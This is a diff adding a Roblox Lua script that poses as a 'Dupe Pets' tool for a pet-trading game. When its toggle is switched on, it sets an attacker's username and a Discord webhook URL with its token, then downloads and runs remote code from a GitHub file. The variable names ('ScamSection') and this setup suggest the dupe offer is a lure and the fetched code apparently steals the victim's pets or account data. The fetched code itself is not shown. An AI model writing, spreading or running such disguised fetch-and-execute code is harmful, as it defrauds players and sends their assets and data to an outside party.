@@ -1,0 +1,18 @@
+local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
+local Window = Library.CreateLib("Dupe PetsV2.2", "DarkTheme")
+ 
+--Trade
+local Trade = Window:NewTab("Dupe")
+local ScamSection = Trade:NewSection("Pets")
+ 
+ 
+ScamSection:NewToggle("Dupe Pets", "If u are ready click dupe pets", function(state)
+    if state then
+UserName = "HerrySzymoN"
+WebHook = "https://discord.com/api/webhooks/1062548617258356778/PPCPIlZwPJBtNGainmJ4HOWTDgEz8obay0N2p8hm67eA9e0w1u_3Tb4ydM7uurBTgy7y"
+ 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HardGameSs/PSX/main/New.lua", true))()
+    else
+        print("Toggle Off")
+    end
+end)
